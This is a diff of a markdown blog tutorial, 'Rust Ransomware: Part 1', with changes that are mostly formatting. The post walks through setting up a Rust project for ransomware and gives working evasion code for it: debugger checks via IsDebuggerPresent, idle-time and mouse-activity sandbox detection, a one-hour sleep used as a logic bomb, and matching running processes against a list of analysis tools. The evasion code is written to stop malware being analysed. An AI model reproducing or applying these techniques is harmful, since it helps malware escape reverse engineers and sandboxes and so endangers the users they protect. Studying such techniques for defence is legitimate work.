@@ -9,7 +9,8 @@ description: Rust Ransomware - Setup and anti-reversing techniques
 # Rust Ransomware: Part 1
 ## Setting up & Implementing Anti-Rerversing techniques in malwares
 
-### 1. Set up
+
+### Set up
 - To set up this lab, please make sure you have a recent version of [Rust](https://www.rust-lang.org/tools/install "Rust Installation") installed.
 - Create a folder on your computer and change into that directory from your Command Prompt
 
@@ -21,9 +22,9 @@ description: Rust Ransomware - Setup and anti-reversing techniques
 - You should see a few files and folders created like below
     ![alt text](/uploads/Cargoinit.JPG "Cargo init")
 
-    ⋅⋅* The **src** folder is where you should put your Rust codes in for the malware.
-    ⋅⋅* The **target** folder is where you can find the products of your code after building it (The .exe file for the malware,...)
-    ⋅⋅* *Cargo.toml* is a file where you can specify the dependencies that your code might need (it's similar to *import* in python)
+    * The **src** folder is where you should put your Rust codes in for the malware.
+    * The **target** folder is where you can find the products of your code after building it (The .exe file for the malware,...)
+    * *Cargo.toml* is a file where you can specify the dependencies that your code might need (it's similar to *import* in python)
 
 - Before starting, append this to your *Cargo.toml* file. Inside the **features** array, we can include the crates that we use from [Rust-Winapi](https://docs.rs/winapi/0.3.8/winapi/index.html "Rust Winapi"). For example, if I want to use Winduser.h on Windows, I can import it as below
 
@@ -33,30 +34,46 @@ description: Rust Ransomware - Setup and anti-reversing techniques
     winapi = { version = "0.3", features = ["winuser"] }
 
 ```
-        
-### 2. Anti-Reversing techniques
-- **IsDebuggerPresent** 
-    * *IsDebuggerPresent* is a cool WinAPI function used to check for the **BeingDebugged** flag in the PEB (Process Environment Block) and will return a non-zero value if it is indeed being debug.
-    
-    * In theory, if this functions returns a non-zero value, the malware should exit immediately instead of executing its behavior to prevent reverse engineers from being able to run it with a debugger attached
 
-    * You can read more about the documentation [here](https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent "IsDebuggerPresent")
+---
+
+
+### Anti-Reversing techniques:
+
+
+### I. IsDebuggerPresent
+
+
+- *IsDebuggerPresent* is a cool WinAPI function used to check for the **BeingDebugged** flag in the PEB (Process Environment Block) and will return a non-zero value if it is indeed being debug.
     
-    * This is what the documentation from Rust Winapi looks like
+
+    - In theory, if this functions returns a non-zero value, the malware should exit immediately instead of executing its behavior to prevent reverse engineers from being able to run it with a debugger attached
+
+
+    - You can read more about the documentation [here](https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent "IsDebuggerPresent")
+    
+
+    - This is what the documentation from Rust Winapi looks like
         ![alt text](/uploads/IsDebuggerPresent.JPG "IsDebuggerPresent")
 
-    * If you trace down the type of the returned variable (*BOOL*), you will find that *BOOL* is just a wrapper for *i32* in Rust!
 
-    * At this point, we're ready to try it out in main.rs!
+    - If you trace down the type of the returned variable (*BOOL*), you will find that *BOOL* is just a wrapper for *i32* in Rust!
 
-    * First, since *IsDebuggerPresent* is from the winapi::um::debugapi crate, we need to import it in **Cargo.toml**.
+
+    - At this point, we're ready to try it out in main.rs!
+
+
+    - First, since *IsDebuggerPresent* is from the winapi::um::debugapi crate, we need to import it in **Cargo.toml**.
+
 
     ```
         winapi = { version = "0.3", features = ["debugapi"}
 
     ```
 
+
     - After that, we can lay it out in **main.rs**:
+
 
     ``` rust
 
@@ -85,125 +102,151 @@ description: Rust Ransomware - Setup and anti-reversing techniques
 
     ```
 
-    * First, we check if *IsDebuggerPresent()* returns a 0 or any other number. If it's 0, the program is not being debugged, so we continue to print "Hello, world!"
+    - First, we check if *IsDebuggerPresent()* returns a 0 or any other number. If it's 0, the program is not being debugged, so we continue to print "Hello, world!"
 
-    * If it's being debugged, we print the debug code out and call std::process::exit(0) to exit immediately!
 
-    * Here is the result:
-        1. Double clicking on the executable /target/debug/Rust-Ransomware.exe. As you can see, the program prints out "Hello, world!"
+    - If it's being debugged, we print the debug code out and call std::process::exit(0) to exit immediately!
+
+
+    - Here is the result:
+
+
+        - Double clicking on the executable /target/debug/Rust-Ransomware.exe. As you can see, the program prints out "Hello, world!"
 
         ![alt text](/uploads/noDebugger.JPG "No debugger")
 
-        1. Debugging this executable in IDA, we can set a break point where we compare eax(the return value from IsDebuggerPresent()). If we execute to this point, you can see that eax = 1, so we will exit immediately!
+
+
+        - Debugging this executable in IDA, we can set a break point where we compare eax(the return value from IsDebuggerPresent()). If we execute to this point, you can see that eax = 1, so we will exit immediately!
 
         ![alt text](/uploads/debuggerIDA2.JPG "Debugger")
 
-    * There are some [ways](https://www.aldeid.com/wiki/IsDebuggerPresent) that reverse engineers can bypass this through dynamic patching or static patching the executable itself, and we can do more things to make our executable anti-patching.
 
-    * Since I'm a bit lazy, I'm not going to attempt this, but maybe we can come back for this another time!
+    - There are some [ways](https://www.aldeid.com/wiki/IsDebuggerPresent) that reverse engineers can bypass this through dynamic patching or static patching the executable itself, and we can do more things to make our executable anti-patching.
+
+
+    - Since I'm a bit lazy, I'm not going to attempt this, but maybe we can come back for this another time!
   
-- **Check for sandbox**
-    - There are a variety of sandbox-evasion techniques. I'm just going to list out a few of them for us to try and implement down here.
+### II. Check for sandbox
+- There are a variety of sandbox-evasion techniques. I'm just going to list out a few of them for us to try and implement down here.
   
-    - If you are interested in more details, I suggest taking a look at [this research paper](https://www.sans.org/reading-room/whitepapers/forensics/detecting-malware-sandbox-evasion-techniques-36667) 
+- If you are interested in more details, I suggest taking a look at [this research paper](https://www.sans.org/reading-room/whitepapers/forensics/detecting-malware-sandbox-evasion-techniques-36667) 
 
-    1. ***Timing-based techniques***
-        * Idle time: The normal idle time on your PC or mine is typically really really short when we are using them. It's around 0.047 seconds on my laptop currently. For a sandbox, there won't be much action happening, and their idle time is typically really long.
-            * We can check and see if the idle time is over a minute. If it is, we are probably in a sandbox
 
-            ``` rust
-                use winapi::um::sysinfoapi::GetTickCount;
-                use winapi::um::winuser::{GetLastInputInfo, LASTINPUTINFO};
+1\. **Timing-based techniques**
 
-                pub fn check_idle_time() -> bool {
-                    unsafe {
-                        let mut last_input_info: LASTINPUTINFO = LASTINPUTINFO {
-                            cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
-                            dwTime: 0u32,
-                        };
-                        GetLastInputInfo(&mut last_input_info);
-                        let idle_time: u32 = (GetTickCount() - last_input_info.dwTime) / 1000;
-                        if idle_time >= 60 {
-                            return true;
-                        }
-                        return false;
-                    }
-                }
-
-            ```
-
-            * The idle time can be calculated by subtracting the time of the last input event(*GetLastInputInfo*) from the time since the system was started(*GetTickCount*).
-            * For *GetLastInputInfo*, it takes in a pointer to a LASTINPUTINFO struct according to [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getlastinputinfo). Therefore, we have to create the struct and put a 0u32 into dwTime field. After calling *GetLastInputInfo*, the system will write into this u32 the time of the last input event!
-            * Try calling this function in main() and you will see that the *idle_time* is typically 0 or 1 on your system.
+* ***Idle time***: The normal idle time on your PC or mine is typically really really short when we are using them. It's around 0.047 seconds on my laptop currently. For a sandbox, there won't be much action happening, and their idle time is typically really long.
         
-        * Logic bomb/sleep: By implementing our malware as a logic bomb, we can stall the execution of the malware and have it sleeps.
-            * Typically, a sandbox analyzes a malware in around 10-20 minutes, we can just go to sleep for a couple of hours and wake up after the sandbox's processing time!
-            * We also can make our malware execute at a specific date and time in the future, defeating the sandbox by waiting it out!
-            * Since this does not need to be too complicated, I just let my malware sleep for an hour before executing anything.
+    * We can check and see if the idle time is over a minute. If it is, we are probably in a sandbox
 
-              ``` rust
 
-                use winapi::um::synchapi::Sleep;
-                pub fn sleep_for_an_hour() {
-                    unsafe { Sleep(3600000) }
-                }
+        ``` rust
+            use winapi::um::sysinfoapi::GetTickCount;
+            use winapi::um::winuser::{GetLastInputInfo, LASTINPUTINFO};
 
-              ```
-
-    2. ***Detecting user interaction***
-        * Usually, users interact with their computers through mouse clicks and the keyboard, but there is extremly unlikely that there is such human-like interactions in a sandbox.
-        * We can make our malware wait for a certain user interactions before executing. The [Trojan.APT.BaneChan](https://www.fireeye.com/blog/threat-research/2013/04/trojan-apt-banechant-in-memory-trojan-that-observes-for-multiple-mouse-clicks.html) sits and waits for a number of mouse clicks before executing its malicious code. I figure we can use this trick!
-
-            ``` rust
-
-            use winapi::um::winuser::{GetAsyncKeyState, VK_RBUTTON};
-            pub fn check_mouse_click(min_clicks: u32) {
-                let mut count: u32 = 0;
-
-                while count < min_clicks {
-                    let key_left_clicked = unsafe { GetAsyncKeyState(VK_RBUTTON) };
-                    if key_left_clicked >> 15 == -1 {
-                        count += 1;
+            pub fn check_idle_time() -> bool {
+                unsafe {
+                    let mut last_input_info: LASTINPUTINFO = LASTINPUTINFO {
+                        cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
+                        dwTime: 0u32,
+                    };
+                    GetLastInputInfo(&mut last_input_info);
+                    let idle_time: u32 = (GetTickCount() - last_input_info.dwTime) / 1000;
+                    if idle_time >= 60 {
+                        return true;
                     }
-                    unsafe { Sleep(100) };
+                    return false;
                 }
             }
 
-            ```
+        ```
+
+    * The idle time can be calculated by subtracting the time of the last input event(*GetLastInputInfo*) from the time since the system was started(*GetTickCount*).
+
+    * For *GetLastInputInfo*, it takes in a pointer to a LASTINPUTINFO struct according to [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getlastinputinfo). Therefore, we have to create the struct and put a 0u32 into dwTime field. After calling *GetLastInputInfo*, the system will write into this u32 the time of the last input event!
+        
+    * Try calling this function in main() and you will see that the *idle_time* is typically 0 or 1 on your system.
+        
+* ***Logic bomb/sleep***: By implementing our malware as a logic bomb, we can stall the execution of the malware and have it sleeps.
+    * Typically, a sandbox analyzes a malware in around 10-20 minutes, we can just go to sleep for a couple of hours and wake up after the sandbox's processing time!
 
 
-        * We can also check the position of the mouse. Since a sandbox does not move the mouse cursor around, we can record the original position, wait for 5 seconds, and record it again. If the mouse position matches exactly, it's highly possible that we are in a sandbox
+    * We also can make our malware execute at a specific date and time in the future, defeating the sandbox by waiting it out!
+        
+        
+    * Since this does not need to be too complicated, I just let my malware sleep for an hour before executing anything.
 
-            ``` rust
 
-                use winapi::um::winuser::{GetCursorPos};
-                use winapi::shared::windef::POINT;
-                pub fn check_cursor_position() -> bool {
-                  let mut cursor: POINT = POINT { x: 0i32, y: 0i32 };
-                  unsafe {
-                      GetCursorPos(&mut cursor);
-                      let x = cursor.x;
-                      let y = cursor.y;
-                      Sleep(5000);
-                      GetCursorPos(&mut cursor);
+        ``` rust
 
-                      if x == cursor.x && y == cursor.y {
-                          return false;
-                      }
-                  }
+        use winapi::um::synchapi::Sleep;
+        pub fn sleep_for_an_hour() {
+            unsafe { Sleep(3600000) }
+        }
 
-                  true
-              }
+        ```
 
-            ```
+2\. ***Detecting user interaction***
 
-    3. ***Running Processes and Services:***
 
-        * Usually, a sandbox has multiple antivirus programs, debuggers, monitoring programs running as active processes. Our malware can check for the availability of some of these to determine if it's being ran in a sandbox
+* Usually, users interact with their computers through mouse clicks and the keyboard, but there is extremly unlikely that there is such human-like interactions in a sandbox.
+
+
+* We can make our malware wait for a certain user interactions before executing. The [Trojan.APT.BaneChan](https://www.fireeye.com/blog/threat-research/2013/04/trojan-apt-banechant-in-memory-trojan-that-observes-for-multiple-mouse-clicks.html) sits and waits for a number of mouse clicks before executing its malicious code. I figure we can use this trick!
+
+    ``` rust
+
+    use winapi::um::winuser::{GetAsyncKeyState, VK_RBUTTON};
+    pub fn check_mouse_click(min_clicks: u32) {
+        let mut count: u32 = 0;
+
+        while count < min_clicks {
+            let key_left_clicked = unsafe { GetAsyncKeyState(VK_RBUTTON) };
+            if key_left_clicked >> 15 == -1 {
+                count += 1;
+            }
+            unsafe { Sleep(100) };
+        }
+    }
+
+    ```
+
+
+* We can also check the position of the mouse. Since a sandbox does not move the mouse cursor around, we can record the original position, wait for 5 seconds, and record it again. If the mouse position matches exactly, it's highly possible that we are in a sandbox
+
+
+    ``` rust
+
+        use winapi::um::winuser::{GetCursorPos};
+        use winapi::shared::windef::POINT;
+        pub fn check_cursor_position() -> bool {
+            let mut cursor: POINT = POINT { x: 0i32, y: 0i32 };
+            unsafe {
+                GetCursorPos(&mut cursor);
+                let x = cursor.x;
+                let y = cursor.y;
+                Sleep(5000);
+                GetCursorPos(&mut cursor);
+
+                if x == cursor.x && y == cursor.y {
+                    return false;
+                }
+            }
+
+            true
+        }
+
+    ```
+
+3\. ***Running Processes and Services:***
+
+
+* Usually, a sandbox has multiple antivirus programs, debuggers, monitoring programs running as active processes. Our malware can check for the availability of some of these to determine if it's being ran in a sandbox
+
+
+* In my code, I looked up how to [numerate all running processes from MSDN](https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes) and translate their C++ code into Rust.
     
-        * In my code, I looked up how to [numerate all running processes from MSDN](https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes) and translate their C++ code into Rust.
-    
-        * Then I extract their names and compare it with a list of executable names that usually exists in sandbox environment.
+* Then I extract their names and compare it with a list of executable names that usually exists in sandbox environment.
   
     ``` rust
             
@@ -308,9 +351,17 @@ description: Rust Ransomware - Setup and anti-reversing techniques
 
     ```
 
-### 3. Recap
+---
+
+### III. Recap
    * We have build the foundation for our malware today! Anti-Reversing is a cool step in malware development since you get to see about the attacker's perspective to protect their own malware against reverse engineer!
+
+
    * Feel free to try out the code! You can find it at my [Github](https://github.com/cdong1012/Rust-Ransomware)
+
+
    * Next post, we will be looking into the ransomware's encryption!
+
+
    * Thank you for reading, and see you next time!
             
